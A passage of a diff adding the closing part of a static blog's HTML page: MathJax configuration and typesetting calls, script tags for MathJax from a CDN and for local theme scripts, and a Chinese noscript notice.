+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
